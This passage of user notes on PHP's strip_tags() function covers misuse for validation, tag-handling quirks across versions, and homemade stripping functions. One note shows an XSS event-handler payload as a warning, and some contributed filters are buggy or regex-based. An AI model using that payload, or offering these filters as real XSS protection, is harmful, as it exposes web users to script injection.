<div class="phpcode"><code><span class="html">One of the most ridiculous and quite common variations of the use of this function, which is often encountered among newcomers to the world of programming, is the use of this function when processing query variables:<br /><br /><span class="default">&lt;?php<br />$search </span><span class="keyword">= isset(</span><span class="default">$_GET</span><span class="keyword">[</span><span class="string">'search'</span><span class="keyword">]) ? </span><span class="default">strip_tags</span><span class="keyword">(</span><span class="default">$_GET</span><span class="keyword">[</span><span class="string">'search'</span><span class="keyword">]) : </span><span class="string">''</span><span class="keyword">;<br /></span><span class="default">?&gt;<br /></span><br />I don’t know the root cause of where this “fashion” came from, perhaps from yet another low-quality book on PHP at the beginning of the century. But the fact remains that this construction is used even now, in the days of PHP8, not only by beginners, but also by developers of commercial systems.<br /><br />Please do not use this function in the manner described above. This doesn't make any practical sense.<br /><br />The HTML code removal function has nothing to do with data validation, much less the topic of SQL injections.<br /><br />Also, you should not use this function when processing data before writing it to the database. It sounds strange, but you can never be sure that when using this function in the corporate system you are designing, you will not lose important incoming data that may (or will eventually become) come in HTML format.<br />A good practice for building systems is to sketch out the data in its original form, “as is,” but you can provide this data in client code according to current business requirements.</span></code></div>
  </div>
 </div>
  <div class="note" id="126104">  <div class="votes">
    <div id="Vu126104">
    <a href="/manual/vote-note.php?id=126104&amp;page=function.strip-tags&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd126104">
    <a href="/manual/vote-note.php?id=126104&amp;page=function.strip-tags&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V126104" title="70% like this...">
    14
    </div>
  </div>
  <a href="#126104" class="name">
  <strong class="user"><em>abe</em></strong></a><a class="genanchor" href="#126104"> &para;</a><div class="date" title="2021-05-24 05:30"><strong>4 years ago</strong></div>
  <div class="text" id="Hcom126104">
<div class="phpcode"><code><span class="html">Note, strip_tags will remove anything looking like a tag - not just tags - i.e. if you have tags in attributes then they may be removed too,<br /><br />e.g. <br /><br />    <span class="default">&lt;?php<br />    $test</span><span class="keyword">=</span><span class="string">'&lt;div a="abc &lt;b&gt;def&lt;/b&gt; hij" b="1"&gt;x&lt;b&gt;y&lt;/b&gt;z&lt;/div&gt;'</span><span class="keyword">;<br />    </span><span class="default">$echo strip_tags</span><span class="keyword">(</span><span class="default">$test</span><span class="keyword">, </span><span class="string">"&lt;div&gt;&lt;b&gt;"</span><span class="keyword">);<br /><br /></span><span class="default">will result in <br /><br />   </span><span class="keyword">&lt;</span><span class="default">div a</span><span class="keyword">=</span><span class="string">"abc bdef/b hij" </span><span class="default">b</span><span class="keyword">=</span><span class="string">"1"</span><span class="keyword">&gt;</span><span class="default">x</span><span class="keyword">&lt;</span><span class="default">b</span><span class="keyword">&gt;</span><span class="default">y</span><span class="keyword">&lt;/</span><span class="default">b</span><span class="keyword">&gt;</span><span class="default">z</span><span class="keyword">&lt;/</span><span class="default">div</span><span class="keyword">&gt;</span></span></code></div>
  </div>
 </div>
  <div class="note" id="117793">  <div class="votes">
    <div id="Vu117793">
    <a href="/manual/vote-note.php?id=117793&amp;page=function.strip-tags&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd117793">
    <a href="/manual/vote-note.php?id=117793&amp;page=function.strip-tags&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V117793" title="66% like this...">
    40
    </div>
  </div>
  <a href="#117793" class="name">
  <strong class="user"><em>doug at exploittheweb dot com</em></strong></a><a class="genanchor" href="#117793"> &para;</a><div class="date" title="2015-08-11 10:17"><strong>10 years ago</strong></div>
  <div class="text" id="Hcom117793">
<div class="phpcode"><code><span class="html">"5.3.4    strip_tags() no longer strips self-closing XHTML tags unless the self-closing XHTML tag is also given in allowable_tags."<br /><br />This is poorly worded.<br /><br />The above seems to be saying that, since 5.3.4, if you don't specify "&lt;br/&gt;" in allowable_tags then "&lt;br/&gt;" will not be stripped... but that's not actually what they're trying to say.<br /><br />What it means is, in versions prior to 5.3.4, it "strips self-closing XHTML tags unless the self-closing XHTML tag is also given in allowable_tags", and that since 5.3.4 this is no longer the case.<br /><br />So what reads as "no longer strips self-closing tags (unless the self-closing XHTML tag is also given in allowable_tags)" is actually saying "no longer (strips self-closing tags unless the self-closing XHTML tag is also given in allowable_tags)".<br /><br />i.e.<br /><br />pre-5.3.4: strip_tags('Hello World&lt;br&gt;&lt;br/&gt;','&lt;br&gt;') =&gt; 'Hello World&lt;br&gt;' // strips &lt;br/&gt; because it wasn't explicitly specified in allowable_tags<br /><br />5.3.4 and later: strip_tags('Hello World&lt;br&gt;&lt;br/&gt;','&lt;br&gt;') =&gt; 'Hello World&lt;br&gt;&lt;br/&gt;' // does not strip &lt;br/&gt; because PHP matches it with &lt;br&gt; in allowable_tags</span></code></div>
  </div>
 </div>
  <div class="note" id="118183">  <div class="votes">
    <div id="Vu118183">
    <a href="/manual/vote-note.php?id=118183&amp;page=function.strip-tags&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd118183">
    <a href="/manual/vote-note.php?id=118183&amp;page=function.strip-tags&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V118183" title="64% like this...">
    23
    </div>
  </div>
  <a href="#118183" class="name">
  <strong class="user"><em>Dr. Gianluigi &amp;#34;Zane&amp;#34; Zanettini</em></strong></a><a class="genanchor" href="#118183"> &para;</a><div class="date" title="2015-10-22 07:52"><strong>9 years ago</strong></div>
  <div class="text" id="Hcom118183">
<div class="phpcode"><code><span class="html">A word of caution. strip_tags() can actually be used for input validation as long as you remove ANY tag. As soon as you accept a single tag (2nd parameter), you are opening up a security hole such as this:<br /><br />&lt;acceptedTag onLoad="javascript:malicious()" /&gt;<br /><br />Plus: regexing away attributes or code block is really not the right solution. For effective input validation when using strip_tags() with even a single tag accepted, <a href="http://htmlpurifier.org/" rel="nofollow" target="_blank">http://htmlpurifier.org/</a> is the way to go.</span></code></div>
  </div>
 </div>
  <div class="note" id="119909">  <div class="votes">
    <div id="Vu119909">
    <a href="/manual/vote-note.php?id=119909&amp;page=function.strip-tags&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd119909">
    <a href="/manual/vote-note.php?id=119909&amp;page=function.strip-tags&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V119909" title="63% like this...">
    26
    </div>
  </div>
  <a href="#119909" class="name">
  <strong class="user"><em>stever at starburstpublishing dot com dot au</em></strong></a><a class="genanchor" href="#119909"> &para;</a><div class="date" title="2016-09-19 06:09"><strong>9 years ago</strong></div>
  <div class="text" id="Hcom119909">
<div class="phpcode"><code><span class="html">Since strip_tags does not remove attributes and thus creates a potential XSS security hole, here is a small function I wrote to allow only specific tags with specific attributes and strip all other tags and attributes.<br /><br />If you only allow formatting tags such as b, i, and p, and styling attributes such as class, id and style, this will strip all javascript including event triggers in formatting tags.<br /><br />Note that allowing anchor tags or href attributes opens another potential security hole that this solution won't protect against. You'll need more comprehensive protection if you plan to allow links in your text.<br /><br /><span class="default">&lt;?php<br /></span><span class="keyword">function </span><span class="default">stripUnwantedTagsAndAttrs</span><span class="keyword">(</span><span class="default">$html_str</span><span class="keyword">){<br />  </span><span class="default">$xml </span><span class="keyword">= new </span><span class="default">DOMDocument</span><span class="keyword">();<br /></span><span class="comment">//Suppress warnings: proper error handling is beyond scope of example<br />  </span><span class="default">libxml_use_internal_errors</span><span class="keyword">(</span><span class="default">true</span><span class="keyword">);<br /></span><span class="comment">//List the tags you want to allow here, NOTE you MUST allow html and body otherwise entire string will be cleared<br />  </span><span class="default">$allowed_tags </span><span class="keyword">= array(</span><span class="string">"html"</span><span class="keyword">, </span><span class="string">"body"</span><span class="keyword">, </span><span class="string">"b"</span><span class="keyword">, </span><span class="string">"br"</span><span class="keyword">, </span><span class="string">"em"</span><span class="keyword">, </span><span class="string">"hr"</span><span class="keyword">, </span><span class="string">"i"</span><span class="keyword">, </span><span class="string">"li"</span><span class="keyword">, </span><span class="string">"ol"</span><span class="keyword">, </span><span class="string">"p"</span><span class="keyword">, </span><span class="string">"s"</span><span class="keyword">, </span><span class="string">"span"</span><span class="keyword">, </span><span class="string">"table"</span><span class="keyword">, </span><span class="string">"tr"</span><span class="keyword">, </span><span class="string">"td"</span><span class="keyword">, </span><span class="string">"u"</span><span class="keyword">, </span><span class="string">"ul"</span><span class="keyword">);<br /></span><span class="comment">//List the attributes you want to allow here<br />  </span><span class="default">$allowed_attrs </span><span class="keyword">= array (</span><span class="string">"class"</span><span class="keyword">, </span><span class="string">"id"</span><span class="keyword">, </span><span class="string">"style"</span><span class="keyword">);<br />  if (!</span><span class="default">strlen</span><span class="keyword">(</span><span class="default">$html_str</span><span class="keyword">)){return </span><span class="default">false</span><span class="keyword">;}<br />  if (</span><span class="default">$xml</span><span class="keyword">-&gt;</span><span class="default">loadHTML</span><span class="keyword">(</span><span class="default">$html_str</span><span class="keyword">, </span><span class="default">LIBXML_HTML_NOIMPLIED </span><span class="keyword">| </span><span class="default">LIBXML_HTML_NODEFDTD</span><span class="keyword">)){<br />    foreach (</span><span class="default">$xml</span><span class="keyword">-&gt;</span><span class="default">getElementsByTagName</span><span class="keyword">(</span><span class="string">"*"</span><span class="keyword">) as </span><span class="default">$tag</span><span class="keyword">){<br />      if (!</span><span class="default">in_array</span><span class="keyword">(</span><span class="default">$tag</span><span class="keyword">-&gt;</span><span class="default">tagName</span><span class="keyword">, </span><span class="default">$allowed_tags</span><span class="keyword">)){<br />        </span><span class="default">$tag</span><span class="keyword">-&gt;</span><span class="default">parentNode</span><span class="keyword">-&gt;</span><span class="default">removeChild</span><span class="keyword">(</span><span class="default">$tag</span><span class="keyword">);<br />      }else{<br />        foreach (</span><span class="default">$tag</span><span class="keyword">-&gt;</span><span class="default">attributes </span><span class="keyword">as </span><span class="default">$attr</span><span class="keyword">){<br />          if (!</span><span class="default">in_array</span><span class="keyword">(</span><span class="default">$attr</span><span class="keyword">-&gt;</span><span class="default">nodeName</span><span class="keyword">, </span><span class="default">$allowed_attrs</span><span class="keyword">)){<br />            </span><span class="default">$tag</span><span class="keyword">-&gt;</span><span class="default">removeAttribute</span><span class="keyword">(</span><span class="default">$attr</span><span class="keyword">-&gt;</span><span class="default">nodeName</span><span class="keyword">);<br />          }<br />        }<br />      }<br />    }<br />  }<br />  return </span><span class="default">$xml</span><span class="keyword">-&gt;</span><span class="default">saveHTML</span><span class="keyword">();<br />}<br /></span><span class="default">?&gt;</span></span></code></div>
  </div>
 </div>
  <div class="note" id="110280">  <div class="votes">
    <div id="Vu110280">
    <a href="/manual/vote-note.php?id=110280&amp;page=function.strip-tags&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd110280">
    <a href="/manual/vote-note.php?id=110280&amp;page=function.strip-tags&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V110280" title="60% like this...">
    45
    </div>
  </div>
  <a href="#110280" class="name">
  <strong class="user"><em>bzplan at web dot de</em></strong></a><a class="genanchor" href="#110280"> &para;</a><div class="date" title="2012-10-07 07:57"><strong>12 years ago</strong></div>
  <div class="text" id="Hcom110280">
<div class="phpcode"><code><span class="html">a HTML code like this: <br /><br /><span class="default">&lt;?php<br />$html </span><span class="keyword">= </span><span class="string">'<br />&lt;div&gt;<br />&lt;p style="color:blue;"&gt;color is blue&lt;/p&gt;&lt;p&gt;size is &lt;span style="font-size:200%;"&gt;huge&lt;/span&gt;&lt;/p&gt;<br />&lt;p&gt;material is wood&lt;/p&gt;<br />&lt;/div&gt;<br />'</span><span class="keyword">; <br /></span><span class="default">?&gt;<br /></span><br />with <span class="default">&lt;?php $str </span><span class="keyword">= </span><span class="default">strip_tags</span><span class="keyword">(</span><span class="default">$html</span><span class="keyword">); </span><span class="default">?&gt;<br /></span>... the result is:<br /><br />$str = 'color is bluesize is huge<br />material is wood'; <br /><br />notice: the words 'blue' and 'size' grow together :( <br />and line-breaks are still in new string $str<br /><br />if you need a space between the words (and without line-break) <br />use my function: <span class="default">&lt;?php $str </span><span class="keyword">= </span><span class="default">rip_tags</span><span class="keyword">(</span><span class="default">$html</span><span class="keyword">); </span><span class="default">?&gt;<br /></span>... the result is:<br /><br />$str = 'color is blue size is huge material is wood'; <br /><br />the function: <br /><br /><span class="default">&lt;?php<br /></span><span class="comment">// -------------------------------------------------------------- <br /><br /></span><span class="keyword">function </span><span class="default">rip_tags</span><span class="keyword">(</span><span class="default">$string</span><span class="keyword">) { <br />    <br />    </span><span class="comment">// ----- remove HTML TAGs ----- <br />    </span><span class="default">$string </span><span class="keyword">= </span><span class="default">preg_replace </span><span class="keyword">(</span><span class="string">'/&lt;[^&gt;]*&gt;/'</span><span class="keyword">, </span><span class="string">' '</span><span class="keyword">, </span><span class="default">$string</span><span class="keyword">); <br />    <br />    </span><span class="comment">// ----- remove control characters ----- <br />    </span><span class="default">$string </span><span class="keyword">= </span><span class="default">str_replace</span><span class="keyword">(</span><span class="string">"\r"</span><span class="keyword">, </span><span class="string">''</span><span class="keyword">, </span><span class="default">$string</span><span class="keyword">);    </span><span class="comment">// --- replace with empty space<br />    </span><span class="default">$string </span><span class="keyword">= </span><span class="default">str_replace</span><span class="keyword">(</span><span class="string">"\n"</span><span class="keyword">, </span><span class="string">' '</span><span class="keyword">, </span><span class="default">$string</span><span class="keyword">);   </span><span class="comment">// --- replace with space<br />    </span><span class="default">$string </span><span class="keyword">= </span><span class="default">str_replace</span><span class="keyword">(</span><span class="string">"\t"</span><span class="keyword">, </span><span class="string">' '</span><span class="keyword">, </span><span class="default">$string</span><span class="keyword">);   </span><span class="comment">// --- replace with space<br />    <br />    // ----- remove multiple spaces ----- <br />    </span><span class="default">$string </span><span class="keyword">= </span><span class="default">trim</span><span class="keyword">(</span><span class="default">preg_replace</span><span class="keyword">(</span><span class="string">'/ {2,}/'</span><span class="keyword">, </span><span class="string">' '</span><span class="keyword">, </span><span class="default">$string</span><span class="keyword">));<br />    <br />    return </span><span class="default">$string</span><span class="keyword">; <br /><br />}<br /><br /></span><span class="comment">// -------------------------------------------------------------- <br /></span><span class="default">?&gt;<br /></span><br />the KEY is the regex pattern: '/&lt;[^&gt;]*&gt;/'<br />instead of strip_tags() <br />... then remove control characters and multiple spaces<br />:)</span></code></div>
  </div>
 </div>
  <div class="note" id="88991">  <div class="votes">
    <div id="Vu88991">
    <a href="/manual/vote-note.php?id=88991&amp;page=function.strip-tags&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd88991">
    <a href="/manual/vote-note.php?id=88991&amp;page=function.strip-tags&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V88991" title="60% like this...">
    45
    </div>
  </div>
  <a href="#88991" class="name">
  <strong class="user"><em>CEO at CarPool2Camp dot org</em></strong></a><a class="genanchor" href="#88991"> &para;</a><div class="date" title="2009-02-17 11:10"><strong>16 years ago</strong></div>
  <div class="text" id="Hcom88991">
<div class="phpcode"><code><span class="html">Note the different outputs from different versions of the same tag:
<br />
<br /><span class="default">&lt;?php </span><span class="comment">// striptags.php
<br /></span><span class="default">$data </span><span class="keyword">= </span><span class="string">'&lt;br&gt;Each&lt;br/&gt;New&lt;br /&gt;Line'</span><span class="keyword">;
<br /></span><span class="default">$new  </span><span class="keyword">= </span><span class="default">strip_tags</span><span class="keyword">(</span><span class="default">$data</span><span class="keyword">, </span><span class="string">'&lt;br&gt;'</span><span class="keyword">);
<br /></span><span class="default">var_dump</span><span class="keyword">(</span><span class="default">$new</span><span class="keyword">);  </span><span class="comment">// OUTPUTS string(21) "&lt;br&gt;EachNew&lt;br /&gt;Line"
<br />
<br /></span><span class="keyword">&lt;?</span><span class="default">php </span><span class="comment">// striptags.php
<br /></span><span class="default">$data </span><span class="keyword">= </span><span class="string">'&lt;br&gt;Each&lt;br/&gt;New&lt;br /&gt;Line'</span><span class="keyword">;
<br /></span><span class="default">$new  </span><span class="keyword">= </span><span class="default">strip_tags</span><span class="keyword">(</span><span class="default">$data</span><span class="keyword">, </span><span class="string">'&lt;br/&gt;'</span><span class="keyword">);
<br /></span><span class="default">var_dump</span><span class="keyword">(</span><span class="default">$new</span><span class="keyword">); </span><span class="comment">// OUTPUTS string(16) "Each&lt;br/&gt;NewLine"
<br />
<br /></span><span class="keyword">&lt;?</span><span class="default">php </span><span class="comment">// striptags.php
<br /></span><span class="default">$data </span><span class="keyword">= </span><span class="string">'&lt;br&gt;Each&lt;br/&gt;New&lt;br /&gt;Line'</span><span class="keyword">;
<br /></span><span class="default">$new  </span><span class="keyword">= </span><span class="default">strip_tags</span><span class="keyword">(</span><span class="default">$data</span><span class="keyword">, </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">);
<br /></span><span class="default">var_dump</span><span class="keyword">(</span><span class="default">$new</span><span class="keyword">); </span><span class="comment">// OUTPUTS string(11) "EachNewLine"
<br /></span><span class="default">?&gt;</span></span></code></div>
  </div>
 </div>
  <div class="note" id="124181">  <div class="votes">
    <div id="Vu124181">
    <a href="/manual/vote-note.php?id=124181&amp;page=function.strip-tags&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd124181">
    <a href="/manual/vote-note.php?id=124181&amp;page=function.strip-tags&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V124181" title="57% like this...">
    9
    </div>
  </div>
  <a href="#124181" class="name">
  <strong class="user"><em>roger dot keulen at vaimo dot com</em></strong></a><a class="genanchor" href="#124181"> &para;</a><div class="date" title="2019-09-09 12:01"><strong>6 years ago</strong></div>
  <div class="text" id="Hcom124181">
<div class="phpcode"><code><span class="html"><a href="https://bugs.php.net/bug.php?id=78346" rel="nofollow" target="_blank">https://bugs.php.net/bug.php?id=78346</a><br /><br />After upgrading from v7.3.3 to v7.3.7 it appears nested "php tags" inside a string are no longer being stripped correctly by strip_tags().<br /><br />This is still working in v7.3.3, v7.2 &amp; v7.1. I've added a simple test below.<br /><br />Test script:<br />---------------<br /><span class="default">&lt;?php<br />$str </span><span class="keyword">= </span><span class="string">'&lt;?= \'&lt;?= 1 ?&gt;\' ?&gt;2'</span><span class="keyword">;<br /></span><span class="default">var_dump</span><span class="keyword">(</span><span class="default">strip_tags</span><span class="keyword">(</span><span class="default">$str</span><span class="keyword">));<br /><br /></span><span class="default">Expected result</span><span class="keyword">:<br />----------------<br /></span><span class="default">string</span><span class="keyword">(</span><span class="default">1</span><span class="keyword">) </span><span class="string">"2"<br /><br /></span><span class="default">Actual result</span><span class="keyword">:<br />--------------<br /></span><span class="default">string</span><span class="keyword">(</span><span class="default">5</span><span class="keyword">) </span><span class="string">"' ?&gt;2"</span></span></code></div>
  </div>
 </div>
  <div class="note" id="120941">  <div class="votes">
    <div id="Vu120941">
    <a href="/manual/vote-note.php?id=120941&amp;page=function.strip-tags&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd120941">
    <a href="/manual/vote-note.php?id=120941&amp;page=function.strip-tags&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V120941" title="56% like this...">
    6
    </div>
  </div>
  <a href="#120941" class="name">
  <strong class="user"><em>Anonymous</em></strong></a><a class="genanchor" href="#120941"> &para;</a><div class="date" title="2017-04-05 12:05"><strong>8 years ago</strong></div>
  <div class="text" id="Hcom120941">
<div class="phpcode"><code><span class="html">Just bzplan's function with the option to choose what tags are replaced for<br /><br />function rip_tags($string, $rep = ' ') { <br />    <br />    // ----- remove HTML TAGs ----- <br />    $string = preg_replace ('/&lt;[^&gt;]*&gt;/', $rep, $string); <br />    <br />    // ----- remove control characters ----- <br />    $string = str_replace("\r", '', $string);    // --- replace with empty space<br />    $string = str_replace("\n", $rep, $string);   // --- replace with space<br />    $string = str_replace("\t", $rep, $string);   // --- replace with space<br />    <br />    // ----- remove multiple spaces ----- <br />    $string = trim(preg_replace('/ {2,}/', $rep, $string));<br />    <br />    return $string; <br /><br />}</span></code></div>
  </div>
 </div>
  <div class="note" id="118485">  <div class="votes">
    <div id="Vu118485">
    <a href="/manual/vote-note.php?id=118485&amp;page=function.strip-tags&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd118485">
    <a href="/manual/vote-note.php?id=118485&amp;page=function.strip-tags&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V118485" title="54% like this...">
    8
    </div>
  </div>
  <a href="#118485" class="name">
  <strong class="user"><em>Trititaty</em></strong></a><a class="genanchor" href="#118485"> &para;</a><div class="date" title="2015-12-14 09:28"><strong>9 years ago</strong></div>
  <div class="text" id="Hcom118485">
<div class="phpcode"><code><span class="html">Features:<br />* allowable tags (as in strip_tags),<br />* optional stripping attributes of the allowable tags,<br />* optional comment preserving,<br />* deleting broken and unclosed tags and comments,<br />* optional callback function call for every piece processed allowing for flexible replacements.<br /><br /><span class="default">&lt;?php<br /></span><span class="keyword">function </span><span class="default">better_strip_tags</span><span class="keyword">( </span><span class="default">$str</span><span class="keyword">, </span><span class="default">$allowable_tags </span><span class="keyword">= </span><span class="string">''</span><span class="keyword">, </span><span class="default">$strip_attrs </span><span class="keyword">= </span><span class="default">false</span><span class="keyword">, </span><span class="default">$preserve_comments </span><span class="keyword">= </span><span class="default">false</span><span class="keyword">, callable </span><span class="default">$callback </span><span class="keyword">= </span><span class="default">null </span><span class="keyword">) {<br />  </span><span class="default">$allowable_tags </span><span class="keyword">= </span><span class="default">array_map</span><span class="keyword">( </span><span class="string">'strtolower'</span><span class="keyword">, </span><span class="default">array_filter</span><span class="keyword">( </span><span class="comment">// lowercase<br />      </span><span class="default">preg_split</span><span class="keyword">( </span><span class="string">'/(?:&gt;|^)\\s*(?:&lt;|$)/'</span><span class="keyword">, </span><span class="default">$allowable_tags</span><span class="keyword">, -</span><span class="default">1</span><span class="keyword">, </span><span class="default">PREG_SPLIT_NO_EMPTY </span><span class="keyword">), </span><span class="comment">// get tag names<br />      </span><span class="keyword">function( </span><span class="default">$tag </span><span class="keyword">) { return </span><span class="default">preg_match</span><span class="keyword">( </span><span class="string">'/^[a-z][a-z0-9_]*$/i'</span><span class="keyword">, </span><span class="default">$tag </span><span class="keyword">); } </span><span class="comment">// filter broken<br />  </span><span class="keyword">) );<br />  </span><span class="default">$comments_and_stuff </span><span class="keyword">= </span><span class="default">preg_split</span><span class="keyword">( </span><span class="string">'/(&lt;!--.*?(?:--&gt;|$))/'</span><span class="keyword">, </span><span class="default">$str</span><span class="keyword">, -</span><span class="default">1</span><span class="keyword">, </span><span class="default">PREG_SPLIT_DELIM_CAPTURE </span><span class="keyword">);<br />  foreach ( </span><span class="default">$comments_and_stuff </span><span class="keyword">as </span><span class="default">$i </span><span class="keyword">=&gt; </span><span class="default">$comment_or_stuff </span><span class="keyword">) {<br />    if ( </span><span class="default">$i </span><span class="keyword">% </span><span class="default">2 </span><span class="keyword">) { </span><span class="comment">// html comment<br />      </span><span class="keyword">if ( !( </span><span class="default">$preserve_comments </span><span class="keyword">&amp;&amp; </span><span class="default">preg_match</span><span class="keyword">( </span><span class="string">'/&lt;!--.*?--&gt;/'</span><span class="keyword">, </span><span class="default">$comment_or_stuff </span><span class="keyword">) ) ) {<br />        </span><span class="default">$comments_and_stuff</span><span class="keyword">[</span><span class="default">$i</span><span class="keyword">] = </span><span class="string">''</span><span class="keyword">;<br />      }<br />    } else { </span><span class="comment">// stuff between comments<br />      </span><span class="default">$tags_and_text </span><span class="keyword">= </span><span class="default">preg_split</span><span class="keyword">( </span><span class="string">"/(&lt;(?:[^&gt;\"']++|\"[^\"]*+(?:\"|$)|'[^']*+(?:'|$))*(?:&gt;|$))/"</span><span class="keyword">, </span><span class="default">$comment_or_stuff</span><span class="keyword">, -</span><span class="default">1</span><span class="keyword">, </span><span class="default">PREG_SPLIT_DELIM_CAPTURE </span><span class="keyword">);<br />      foreach ( </span><span class="default">$tags_and_text </span><span class="keyword">as </span><span class="default">$j </span><span class="keyword">=&gt; </span><span class="default">$tag_or_text </span><span class="keyword">) {<br />        </span><span class="default">$is_broken </span><span class="keyword">= </span><span class="default">false</span><span class="keyword">;<br />        </span><span class="default">$is_allowable </span><span class="keyword">= </span><span class="default">true</span><span class="keyword">;<br />        </span><span class="default">$result </span><span class="keyword">= </span><span class="default">$tag_or_text</span><span class="keyword">;<br />        if ( </span><span class="default">$j </span><span class="keyword">% </span><span class="default">2 </span><span class="keyword">) { </span><span class="comment">// tag<br />          </span><span class="keyword">if ( </span><span class="default">preg_match</span><span class="keyword">( </span><span class="string">"%^(&lt;/?)([a-z][a-z0-9_]*)\\b(?:[^&gt;\"'/]++|/+?|\"[^\"]*\"|'[^']*')*?(/?&gt;)%i"</span><span class="keyword">, </span><span class="default">$tag_or_text</span><span class="keyword">, </span><span class="default">$matches </span><span class="keyword">) ) {<br />            </span><span class="default">$tag </span><span class="keyword">= </span><span class="default">strtolower</span><span class="keyword">( </span><span class="default">$matches</span><span class="keyword">[</span><span class="default">2</span><span class="keyword">] );<br />            if ( </span><span class="default">in_array</span><span class="keyword">( </span><span class="default">$tag</span><span class="keyword">, </span><span class="default">$allowable_tags </span><span class="keyword">) ) {<br />              if ( </span><span class="default">$strip_attrs </span><span class="keyword">) {<br />                </span><span class="default">$opening </span><span class="keyword">= </span><span class="default">$matches</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">];<br />                </span><span class="default">$closing </span><span class="keyword">= ( </span><span class="default">$opening </span><span class="keyword">=== </span><span class="string">'&lt;/' </span><span class="keyword">) ? </span><span class="string">'&gt;' </span><span class="keyword">: </span><span class="default">$closing</span><span class="keyword">;<br />                </span><span class="default">$result </span><span class="keyword">= </span><span class="default">$opening </span><span class="keyword">. </span><span class="default">$tag </span><span class="keyword">. </span><span class="default">$closing</span><span class="keyword">;<br />              }<br />            } else {<br />              </span><span class="default">$is_allowable </span><span class="keyword">= </span><span class="default">false</span><span class="keyword">;<br />              </span><span class="default">$result </span><span class="keyword">= </span><span class="string">''</span><span class="keyword">;<br />            }<br />          } else {<br />            </span><span class="default">$is_broken </span><span class="keyword">= </span><span class="default">true</span><span class="keyword">;<br />            </span><span class="default">$result </span><span class="keyword">= </span><span class="string">''</span><span class="keyword">;<br />          }<br />        } else { </span><span class="comment">// text<br />          </span><span class="default">$tag </span><span class="keyword">= </span><span class="default">false</span><span class="keyword">;<br />        }<br />        if ( !</span><span class="default">$is_broken </span><span class="keyword">&amp;&amp; isset( </span><span class="default">$callback </span><span class="keyword">) ) {<br />          </span><span class="comment">// allow result modification<br />          </span><span class="default">call_user_func_array</span><span class="keyword">( </span><span class="default">$callback</span><span class="keyword">, array( &amp;</span><span class="default">$result</span><span class="keyword">, </span><span class="default">$tag_or_text</span><span class="keyword">, </span><span class="default">$tag</span><span class="keyword">, </span><span class="default">$is_allowable </span><span class="keyword">) );<br />        }<br />        </span><span class="default">$tags_and_text</span><span class="keyword">[</span><span class="default">$j</span><span class="keyword">] = </span><span class="default">$result</span><span class="keyword">;<br />      }<br />      </span><span class="default">$comments_and_stuff</span><span class="keyword">[</span><span class="default">$i</span><span class="keyword">] = </span><span class="default">implode</span><span class="keyword">( </span><span class="string">''</span><span class="keyword">, </span><span class="default">$tags_and_text </span><span class="keyword">);<br />    }<br />  }<br />  </span><span class="default">$str </span><span class="keyword">= </span><span class="default">implode</span><span class="keyword">( </span><span class="string">''</span><span class="keyword">, </span><span class="default">$comments_and_stuff </span><span class="keyword">);<br />  return </span><span class="default">$str</span><span class="keyword">;<br />}<br /></span><span class="default">?&gt;<br /></span><br />Callback arguments:<br />* &amp;$result: contains text to be placed insted of original piece (e.g. empty string for forbidden tags), it can be changed;<br />* $tag_or_text: original piece of text or a tag (see below);<br />* $tag: false for text between tags, lowercase tag name for tags;<br />* $is_allowable: boolean telling if a tag isn't allowed (to avoid double checking), always true for text between tags<br />Callback function isn't called for comments and broken tags.<br /><br />Caution: the function doesn't fully validate tags (the more so HTML itself), it just force strips those obviously broken (in addition to stripping forbidden tags). If you want to get valid tags then use strip_attrs option, though it doesn't guarantee tags are balanced or used in the appropriate context. For complex logic consider using DOM parser.</span></code></div>
  </div>
 </div>
  <div class="note" id="62705">  <div class="votes">
    <div id="Vu62705">
    <a href="/manual/vote-note.php?id=62705&amp;page=function.strip-tags&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd62705">
    <a href="/manual/vote-note.php?id=62705&amp;page=function.strip-tags&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V62705" title="54% like this...">
    7
    </div>
  </div>
  <a href="#62705" class="name">
  <strong class="user"><em>cesar at nixar dot org</em></strong></a><a class="genanchor" href="#62705"> &para;</a><div class="date" title="2006-03-07 11:44"><strong>19 years ago</strong></div>
  <div class="text" id="Hcom62705">
